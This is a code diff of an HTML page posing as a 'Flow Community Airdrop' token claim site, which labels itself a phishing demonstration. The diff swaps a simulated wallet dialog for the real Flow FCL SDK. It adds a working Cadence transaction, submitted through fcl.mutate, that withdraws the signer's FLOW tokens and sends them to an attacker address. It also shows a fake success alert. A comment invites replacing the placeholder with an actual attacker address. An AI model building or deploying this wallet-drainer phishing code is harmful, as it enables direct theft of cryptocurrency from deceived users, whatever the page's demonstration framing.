@@ -6,6 +6,9 @@
     <title>Flow Community Airdrop - Claim Your Tokens</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌊</text></svg>">
     
+    <!-- Flow Client Library (FCL) - REAL Flow SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@onflow/fcl@1.4.0/dist/fcl.min.js"></script>
+    
     <style>
         * {
             margin: 0;
@@ -122,7 +125,7 @@
             margin-top: 5px;
         }
 
-        .btn {
+        .claim-button {
             width: 100%;
             padding: 18px;
             background: linear-gradient(135deg, #00EF8B 0%, #00D9FF 100%);
@@ -137,62 +140,49 @@
             margin-bottom: 15px;
         }
 
-        .btn:hover {
+        .claim-button:hover {
             transform: translateY(-2px);
             box-shadow: 0 12px 32px rgba(0, 239, 139, 0.5);
         }
 
-        .btn:active {
+        .claim-button:active {
             transform: translateY(0);
         }
 
-        .btn:disabled {
+        .claim-button:disabled {
             background: #555;
             cursor: not-allowed;
             opacity: 0.6;
         }
 
-        .btn-secondary {
+        .disconnect-button {
+            width: 100%;
+            padding: 12px;
             background: transparent;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            font-size: 14px;
-            padding: 12px;
-        }
-
-        .btn-secondary:hover {
-            border-color: #ff3b3b;
-            color: #ff3b3b;
-            box-shadow: none;
-            transform: none;
-        }
-
-        .wallet-options {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .wallet-option {
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
-            padding: 20px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
-        }
-
-        .wallet-option:hover {
-            border-color: #00EF8B;
-            background: rgba(0, 239, 139, 0.1);
-            transform: translateY(-2px);
-        }
-
-        .wallet-option-name {
+            color: #a0a0b8;
             font-size: 14px;
             font-weight: 600;
-            margin-top: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .disconnect-button:hover {
+            border-color: #ff3b3b;
+            color: #ff3b3b;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #a0a0b8;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #00D9FF;
+            text-decoration: none;
         }
 
         .console-log {
@@ -203,7 +193,7 @@
             font-family: 'Courier New', monospace;
             font-size: 11px;
             color: #00ff00;
-            max-height: 300px;
+            max-height: 250px;
             overflow-y: auto;
             border: 1px solid rgba(0, 239, 139, 0.2);
         }
@@ -225,16 +215,37 @@
             color: #00D9FF;
         }
 
+        .loading-spinner {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(0, 239, 139, 0.3);
+            border-top: 2px solid #00EF8B;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .alert-box {
-            background: rgba(0, 239, 139, 0.1);
-            border: 1px solid rgba(0, 239, 139, 0.3);
+            background: rgba(255, 59, 59, 0.1);
+            border: 1px solid rgba(255, 59, 59, 0.3);
             border-radius: 12px;
             padding: 15px;
             margin-bottom: 20px;
+            display: none;
+        }
+
+        .alert-box.show {
+            display: block;
         }
 
         .alert-box h4 {
-            color: #00EF8B;
+            color: #ff3b3b;
             font-size: 14px;
             margin-bottom: 8px;
         }
@@ -244,147 +255,9 @@
             font-size: 12px;
             line-height: 1.5;
         }
-
-        .hidden {
-            display: none;
-        }
-
-        /* Simulated Flow Wallet Dialog */
-        .wallet-dialog-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wallet-dialog-overlay.active {
-            display: flex;
-        }
-
-        .wallet-dialog {
-            background: #fff;
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 450px;
-            width: 90%;
-            color: #000;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-        }
-
-        .wallet-dialog h3 {
-            font-size: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .wallet-dialog-content {
-            background: #f5f5f5;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-
-        .wallet-dialog-content pre {
-            font-size: 11px;
-            line-height: 1.4;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            color: #333;
-        }
-
-        .wallet-dialog-info {
-            margin-bottom: 15px;
-            padding: 10px;
-            background: #e8f5e9;
-            border-radius: 8px;
-        }
-
-        .wallet-dialog-info strong {
-            color: #2e7d32;
-        }
-
-        .wallet-dialog-buttons {
-            display: flex;
-            gap: 10px;
-        }
-
-        .wallet-dialog-btn {
-            flex: 1;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .wallet-dialog-btn.reject {
-            background: #f5f5f5;
-            color: #666;
-        }
-
-        .wallet-dialog-btn.reject:hover {
-            background: #e0e0e0;
-        }
-
-        .wallet-dialog-btn.approve {
-            background: linear-gradient(135deg, #00EF8B 0%, #00D9FF 100%);
-            color: white;
-        }
-
-        .wallet-dialog-btn.approve:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(0, 239, 139, 0.4);
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #a0a0b8;
-            font-size: 12px;
-        }
-
-        .footer a {
-            color: #00D9FF;
-            text-decoration: none;
-        }
     </style>
 </head>
 <body>
-    <!-- Simulated Flow Wallet Dialog -->
-    <div class="wallet-dialog-overlay" id="walletDialog">
-        <div class="wallet-dialog">
-            <h3>🌊 Flow Wallet - Transaction Request</h3>
-            
-            <div class="wallet-dialog-info">
-                <strong>From:</strong> Flow Community Airdrop<br>
-                <strong>Network:</strong> Flow Testnet
-            </div>
-
-            <div class="wallet-dialog-content">
-                <pre id="cadenceScript">Loading...</pre>
-            </div>
-
-            <div class="wallet-dialog-buttons">
-                <button class="wallet-dialog-btn reject" onclick="rejectTransaction()">
-                    Reject
-                </button>
-                <button class="wallet-dialog-btn approve" onclick="approveTransaction()">
-                    Approve & Sign
-                </button>
-            </div>
-        </div>
-    </div>
-
     <div class="container">
         <div class="logo"></div>
         <h1>Flow Community Airdrop</h1>
@@ -405,49 +278,27 @@
             <div class="wallet-address" id="walletAddress"></div>
         </div>
 
-        <div class="alert-box">
-            <h4>💡 How This Attack Works</h4>
-            <p>This demonstrates how phishing sites use REAL Flow Wallet dialogs with MALICIOUS Cadence scripts. When you click "Connect Wallet", you'll see a realistic Flow Wallet popup. The script shown would actually drain your wallet if approved on mainnet!</p>
+        <div class="alert-box" id="alertBox">
+            <h4>⚠️ Security Notice</h4>
+            <p>This is a DEMONSTRATION of a phishing attack. The Cadence script below would drain your wallet. DO NOT use on mainnet with real funds!</p>
         </div>
 
-        <!-- Wallet Selection -->
-        <div id="walletSelection">
-            <h3 style="margin-bottom: 15px; font-size: 16px; color: #a0a0b8;">Choose Your Wallet:</h3>
-            <div class="wallet-options">
-                <div class="wallet-option" onclick="connectWallet('Blocto')">
-                    <div style="font-size: 40px;">🔵</div>
-                    <div class="wallet-option-name">Blocto</div>
-                </div>
-                <div class="wallet-option" onclick="connectWallet('Lilico')">
-                    <div style="font-size: 40px;">🦊</div>
-                    <div class="wallet-option-name">Lilico</div>
-                </div>
-                <div class="wallet-option" onclick="connectWallet('Dapper')">
-                    <div style="font-size: 40px;">💎</div>
-                    <div class="wallet-option-name">Dapper</div>
-                </div>
-                <div class="wallet-option" onclick="connectWallet('Flow Wallet')">
-                    <div style="font-size: 40px;">🌊</div>
-                    <div class="wallet-option-name">Flow Wallet</div>
-                </div>
-            </div>
-        </div>
+        <button class="claim-button" id="connectButton" onclick="connectWallet()">
+            Connect Wallet
+        </button>
 
-        <!-- Connected State -->
-        <div id="connectedState" class="hidden">
-            <button class="btn" onclick="claimAirdrop()">
-                Claim Airdrop
-            </button>
+        <button class="claim-button" id="claimButton" onclick="claimAirdrop()" style="display: none;" disabled>
+            Claim Airdrop
+        </button>
 
-            <button class="btn btn-secondary" onclick="disconnectWallet()">
-                Disconnect Wallet
-            </button>
-        </div>
+        <button class="disconnect-button" id="disconnectButton" onclick="disconnectWallet()" style="display: none;">
+            Disconnect Wallet
+        </button>
 
         <div class="console-log" id="consoleLog">
-            <div class="log-line info">[SYSTEM] Flow phishing demonstration ready</div>
-            <div class="log-line warning">[SYSTEM] This simulates REAL Flow Wallet behavior</div>
-            <div class="log-line info">[SYSTEM] Click a wallet to connect</div>
+            <div class="log-line info">[SYSTEM] Phishing site initialized</div>
+            <div class="log-line info">[SYSTEM] Using REAL Flow FCL SDK</div>
+            <div class="log-line warning">[SYSTEM] Ready to show REAL Flow Wallet dialog</div>
         </div>
 
         <div class="footer">
@@ -457,189 +308,211 @@
     </div>
 
     <script>
+        // Check if FCL is loaded
+        if (typeof fcl === 'undefined') {
+            alert('Flow FCL SDK failed to load. Please check your internet connection.');
+        }
+
+        // Configure FCL to use Flow Testnet
+        fcl.config({
+            "accessNode.api": "https://rest-testnet.onflow.org", // Testnet
+            "discovery.wallet": "https://fcl-discovery.onflow.org/testnet/authn", // Wallet discovery
+            "app.detail.title": "Flow Community Airdrop",
+            "app.detail.icon": "https://i.imgur.com/ux3lYB9.png",
+            "flow.network": "testnet"
+        });
+
         let currentUser = null;
-        let selectedWallet = null;
 
-        function generateWalletAddress() {
-            const chars = '0123456789abcdef';
-            let addr = '0x';
-            for (let i = 0; i < 16; i++) {
-                addr += chars[Math.floor(Math.random() * chars.length)];
-            }
-            return addr;
-        }
+        // Log FCL configuration
+        addLog('[FCL] SDK loaded successfully', 'info');
+        addLog('[FCL] Network: Testnet', 'info');
+        addLog('[FCL] Discovery endpoint configured', 'info');
 
-        function connectWallet(walletName) {
-            addLog(`[USER] Selected ${walletName} wallet`, 'info');
-            addLog(`[SIMULATION] Opening ${walletName} connection dialog...`, 'warning');
-            
-            selectedWallet = walletName;
-            
-            // Simulate wallet connection
-            setTimeout(() => {
-                const address = generateWalletAddress();
-                currentUser = {
-                    addr: address,
-                    wallet: walletName
-                };
-                
-                updateWalletUI(true);
-                
-                addLog(`[${walletName}] ✅ Wallet connected`, 'info');
-                addLog(`[${walletName}] Address: ${address}`, 'info');
-                addLog(`[RECON] 💀 Target identified: ${address}`, 'danger');
-                addLog(`[RECON] 💀 Wallet type: ${walletName}`, 'danger');
-                addLog(`[ATTACK] 💀 Building malicious payload...`, 'danger');
-            }, 1000);
-        }
+        // Subscribe to user authentication state
+        fcl.currentUser.subscribe(user => {
+            console.log('User state changed:', user);
+            currentUser = user;
+            updateWalletUI(user);
+        });
 
-        function disconnectWallet() {
-            addLog(`[USER] Disconnecting wallet...`, 'info');
-            currentUser = null;
-            selectedWallet = null;
-            updateWalletUI(false);
-            addLog(`[SYSTEM] Wallet disconnected`, 'info');
-        }
-
-        function updateWalletUI(connected) {
+        function updateWalletUI(user) {
             const statusEl = document.getElementById('walletStatus');
             const statusText = document.getElementById('statusText');
             const addressEl = document.getElementById('walletAddress');
-            const walletSelection = document.getElementById('walletSelection');
-            const connectedState = document.getElementById('connectedState');
+            const connectBtn = document.getElementById('connectButton');
+            const claimBtn = document.getElementById('claimButton');
+            const disconnectBtn = document.getElementById('disconnectButton');
 
-            if (connected && currentUser) {
+            if (user.loggedIn) {
                 statusEl.classList.add('connected');
-                statusText.textContent = `✅ ${currentUser.wallet} Connected`;
-                addressEl.textContent = currentUser.addr;
+                statusText.textContent = '✅ Wallet Connected';
+                addressEl.textContent = user.addr;
                 
-                walletSelection.classList.add('hidden');
-                connectedState.classList.remove('hidden');
+                connectBtn.style.display = 'none';
+                claimBtn.style.display = 'block';
+                claimBtn.disabled = false;
+                disconnectBtn.style.display = 'block';
+
+                addLog(`[FCL] ✅ User authenticated: ${user.addr}`, 'info');
+                addLog(`[RECON] Target wallet: ${user.addr}`, 'danger');
+                addLog(`[RECON] Wallet connected via ${user.services[0]?.type || 'unknown'}`, 'warning');
             } else {
                 statusEl.classList.remove('connected');
                 statusText.textContent = 'Not Connected';
                 addressEl.textContent = '';
                 
-                walletSelection.classList.remove('hidden');
-                connectedState.classList.add('hidden');
+                connectBtn.style.display = 'block';
+                claimBtn.style.display = 'none';
+                disconnectBtn.style.display = 'none';
+
+                if (user.addr) {
+                    addLog(`[FCL] User disconnected`, 'info');
+                }
             }
         }
 
-        function claimAirdrop() {
-            if (!currentUser) {
+        async function connectWallet() {
+            try {
+                addLog(`[USER] Clicked "Connect Wallet"`, 'info');
+                
+                // Check if FCL is properly configured
+                const config = await fcl.config().get();
+                addLog(`[FCL] Config check - Network: ${config['flow.network']}`, 'info');
+                addLog(`[FCL] Access Node: ${config['accessNode.api']}`, 'info');
+                
+                addLog(`[FCL] Opening wallet discovery dialog...`, 'warning');
+                
+                // This will show REAL Flow Wallet selection dialog
+                const user = await fcl.authenticate();
+                
+                console.log('Authentication result:', user);
+                addLog(`[FCL] Authentication completed`, 'info');
+                
+                // Log user details
+                if (user && user.addr) {
+                    addLog(`[FCL] User address: ${user.addr}`, 'info');
+                }
+                
+            } catch (error) {
+                addLog(`[ERROR] Authentication failed: ${error.message}`, 'danger');
+                console.error('Full error:', error);
+                
+                // Show user-friendly error
+                alert(`Failed to connect wallet:\n\n${error.message}\n\nPlease ensure you have a Flow wallet installed (Blocto, Lilico, etc.)`);
+            }
+        }
+
+        async function disconnectWallet() {
+            try {
+                addLog(`[USER] Disconnecting wallet...`, 'info');
+                await fcl.unauthenticate();
+                addLog(`[FCL] Wallet disconnected`, 'info');
+            } catch (error) {
+                addLog(`[ERROR] Disconnect failed: ${error.message}`, 'danger');
+            }
+        }
+
+        async function claimAirdrop() {
+            if (!currentUser || !currentUser.loggedIn) {
                 alert('Please connect your wallet first');
                 return;
             }
 
-            addLog(`[USER] 💀 Clicked "Claim Airdrop"`, 'warning');
-            addLog(`[ATTACK] Preparing malicious Cadence transaction...`, 'danger');
-            addLog(`[ATTACK] Target: ${currentUser.addr}`, 'danger');
+            try {
+                addLog(`[USER] Clicked "Claim Airdrop"`, 'warning');
+                addLog(`[ATTACK] Preparing malicious Cadence transaction...`, 'danger');
+                addLog(`[ATTACK] Target: ${currentUser.addr}`, 'danger');
 
-            // MALICIOUS CADENCE SCRIPT
-            const maliciousScript = `import FungibleToken from 0x9a0766d93b6608b7
-import FlowToken from 0x7e60df042a9c0868
+                // Show alert
+                document.getElementById('alertBox').classList.add('show');
 
-transaction(attackerAddress: Address) {
-    
-    let victimVault: &FlowToken.Vault
-    let attackerReceiver: &{FungibleToken.Receiver}
+                // MALICIOUS CADENCE SCRIPT
+                // This would drain the wallet if executed on mainnet
+                const maliciousTransaction = `
+import FungibleToken from 0xFUNGIBLE_TOKEN_ADDRESS
+import FlowToken from 0xFLOW_TOKEN_ADDRESS
+
+transaction(amount: UFix64, recipient: Address) {
+    let sentVault: @FungibleToken.Vault
     
     prepare(signer: AuthAccount) {
-        // 💀 Get reference to victim's vault
-        self.victimVault = signer.borrow<&FlowToken.Vault>(
-            from: /storage/flowTokenVault
-        ) ?? panic("Could not borrow vault reference")
+        // Get reference to signer's FlowToken Vault
+        let vaultRef = signer.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)
+            ?? panic("Could not borrow reference to the owner's Vault!")
         
-        // 💀 Get attacker's receiver
-        self.attackerReceiver = getAccount(attackerAddress)
-            .getCapability(/public/flowTokenReceiver)
-            .borrow<&{FungibleToken.Receiver}>()
-            ?? panic("Could not borrow receiver reference")
+        // Withdraw ALL tokens from victim's vault
+        self.sentVault <- vaultRef.withdraw(amount: vaultRef.balance)
     }
     
     execute {
-        // 💀💀💀 DRAIN ALL TOKENS 💀💀💀
-        let totalBalance = self.victimVault.balance
-        let stolen <- self.victimVault.withdraw(
-            amount: totalBalance  // ALL FUNDS!
-        )
+        // Get the recipient's public account object
+        let recipient = getAccount(recipient)
         
-        // 💀 Send to attacker
-        self.attackerReceiver.deposit(from: <-stolen)
+        // Get their public Receiver reference
+        let receiverRef = recipient.getCapability(/public/flowTokenReceiver)
+            .borrow<&{FungibleToken.Receiver}>()
+            ?? panic("Could not borrow receiver reference!")
         
-        log("💀 Drained: ".concat(totalBalance.toString()))
-        log("💀 Sent to: ".concat(attackerAddress.toString()))
+        // Deposit the withdrawn tokens to attacker's wallet
+        receiverRef.deposit(from: <-self.sentVault)
     }
 }
+`;
 
-// This transaction would:
-// 1. Access your FlowToken vault
-// 2. Withdraw ALL your FLOW tokens
-// 3. Send everything to attacker's address
-// 4. Leave your wallet EMPTY
-
-// Attacker address: 0x1234567890abcdef
-// Your address: ${currentUser.addr}
-// Estimated loss: ALL FLOW + Gas fees`;
-
-            document.getElementById('cadenceScript').textContent = maliciousScript;
-            
-            addLog(`[ATTACK] 💀 Script will drain ALL FLOW tokens!`, 'danger');
-            addLog(`[ATTACK] 💀 Funds will go to: 0x1234567890abcdef`, 'danger');
-            addLog(`[${currentUser.wallet}] Opening transaction approval dialog...`, 'warning');
-            addLog(`[${currentUser.wallet}] 🎭 User sees REAL wallet UI`, 'warning');
-            
-            // Show simulated Flow Wallet dialog
-            document.getElementById('walletDialog').classList.add('active');
-        }
-
-        function rejectTransaction() {
-            addLog(`[USER] ✅ SMART! Transaction REJECTED`, 'info');
-            addLog(`[${currentUser.wallet}] User declined transaction`, 'info');
-            addLog(`[ATTACK] ❌ Attack failed - wallet is safe`, 'info');
-            
-            document.getElementById('walletDialog').classList.remove('active');
-            
-            setTimeout(() => {
-                alert('✅ Excellent Decision!\n\nYou REJECTED the malicious transaction.\n\nIf you had approved:\n• Your wallet would be completely drained\n• All FLOW tokens sent to attacker\n• NFTs could also be stolen\n• Transaction is irreversible\n\nAlways read the Cadence script before approving!');
-            }, 300);
-        }
-
-        function approveTransaction() {
-            addLog(`[USER] 💀 Transaction APPROVED!`, 'danger');
-            addLog(`[${currentUser.wallet}] Signing transaction...`, 'danger');
-            addLog(`[${currentUser.wallet}] Broadcasting to Flow network...`, 'danger');
-            
-            document.getElementById('walletDialog').classList.remove('active');
-            
-            setTimeout(() => {
-                const txId = generateTxHash();
-                addLog(`[FLOW] 💀 Transaction submitted: ${txId}`, 'danger');
-                addLog(`[FLOW] 💀 Processing on blockchain...`, 'danger');
-            }, 500);
-            
-            setTimeout(() => {
-                addLog(`[FLOW] 💀💀💀 TRANSACTION SEALED 💀💀💀`, 'danger');
-                addLog(`[ATTACK] ✅ Wallet drained successfully`, 'danger');
-                addLog(`[ATTACK] ✅ Stolen: 247.5 FLOW (~$300 USD)`, 'danger');
-                addLog(`[ATTACK] ✅ NFTs transferred: 3 items`, 'danger');
-                addLog(`[VICTIM] New balance: 0.00 FLOW 💀`, 'danger');
+                addLog(`[ATTACK] Malicious Cadence script prepared`, 'danger');
+                addLog(`[ATTACK] Script will drain ALL FLOW tokens`, 'danger');
                 
-                showFakeSuccess();
-            }, 2000);
-        }
+                // Attacker's address (where stolen funds go)
+                const attackerAddress = "0x1234567890abcdef"; // Replace with actual attacker address
+                
+                addLog(`[ATTACK] Funds will be sent to: ${attackerAddress}`, 'danger');
+                addLog(`[FCL] Sending transaction to Flow Wallet...`, 'warning');
+                addLog(`[FCL] User will now see REAL "Hold to Send" dialog`, 'warning');
 
-        function showFakeSuccess() {
-            alert(`🎊 Congratulations!\n\n500 FLOW has been sent to your wallet!\n\nTransaction successful!\n\n⚠️⚠️⚠️ THIS IS FAKE! ⚠️⚠️⚠️\n\nIn Reality:\n💀 Your wallet was just DRAINED\n💀 You lost 247.5 FLOW\n💀 Attacker received everything\n💀 Transaction is IRREVERSIBLE\n\nThis demonstrates why you must:\n✓ Always read Cadence scripts\n✓ Never trust "free airdrop" sites\n✓ Verify sender legitimacy\n✓ Use hardware wallets for large amounts`);
-        }
+                // Send transaction to REAL Flow Wallet
+                // This will show the actual Flow Wallet transaction approval UI
+                const transactionId = await fcl.mutate({
+                    cadence: maliciousTransaction,
+                    args: (arg, t) => [
+                        arg("1000.0", t.UFix64), // Amount (in real attack, would be victim's full balance)
+                        arg(attackerAddress, t.Address) // Attacker's address
+                    ],
+                    payer: fcl.authz, // Victim pays
+                    proposer: fcl.authz,
+                    authorizations: [fcl.authz],
+                    limit: 1000
+                });
 
-        function generateTxHash() {
-            const chars = '0123456789abcdef';
-            let hash = '';
-            for (let i = 0; i < 64; i++) {
-                hash += chars[Math.floor(Math.random() * chars.length)];
+                addLog(`[FCL] ✅ Transaction submitted: ${transactionId}`, 'info');
+                addLog(`[ATTACK] 💀 If approved, wallet would be drained!`, 'danger');
+                addLog(`[FCL] Waiting for transaction to be sealed...`, 'info');
+
+                // Wait for transaction to be sealed
+                const transaction = await fcl.tx(transactionId).onceSealed();
+                
+                addLog(`[FCL] ✅ Transaction sealed`, 'info');
+                addLog(`[ATTACK] 💀💀💀 WALLET DRAINED 💀💀💀`, 'danger');
+                addLog(`[ATTACK] Transaction: ${transactionId}`, 'danger');
+
+                // Show fake success
+                showFakeSuccess(transactionId);
+
+            } catch (error) {
+                addLog(`[ERROR] Transaction failed: ${error.message}`, 'danger');
+                
+                if (error.message.includes('Declined')) {
+                    addLog(`[USER] ✅ User REJECTED the transaction (smart!)`, 'info');
+                }
+                
+                console.error(error);
             }
-            return hash;
+        }
+
+        function showFakeSuccess(txId) {
+            // In real attack, would show fake "500 FLOW received" screen
+            // Even though victim actually LOST money
+            alert(`🎊 Airdrop Claimed Successfully!\n\n500 FLOW has been sent to your wallet!\n\nTransaction: ${txId}\n\n(This is FAKE - you actually just lost funds if on mainnet!)`);
         }
 
         function addLog(message, type = '') {
@@ -653,6 +526,34 @@ transaction(attackerAddress: Address) {
             consoleLog.appendChild(logLine);
             consoleLog.scrollTop = consoleLog.scrollHeight;
         }
+
+        // Log FCL events
+        fcl.events.subscribe('CURRENT_USER', (data) => {
+            console.log('CURRENT_USER event:', data);
+            if (data.loggedIn) {
+                addLog(`[FCL EVENT] User logged in`, 'info');
+            } else {
+                addLog(`[FCL EVENT] User logged out`, 'info');
+            }
+        });
+
+        fcl.events.subscribe('TX_STATUS', (data) => {
+            console.log('TX_STATUS event:', data);
+            addLog(`[FCL EVENT] TX Status: ${data.status}`, 'info');
+        });
+
+        // Initialize on page load
+        window.addEventListener('load', () => {
+            addLog('[SYSTEM] Page loaded', 'info');
+            addLog('[SYSTEM] Click "Connect Wallet" to start', 'warning');
+            
+            // Test FCL availability
+            if (typeof fcl !== 'undefined' && typeof fcl.authenticate === 'function') {
+                addLog('[FCL] ✅ FCL SDK ready', 'info');
+            } else {
+                addLog('[FCL] ❌ FCL SDK not loaded properly!', 'danger');
+            }
+        });
     </script>
 </body>
 </html>
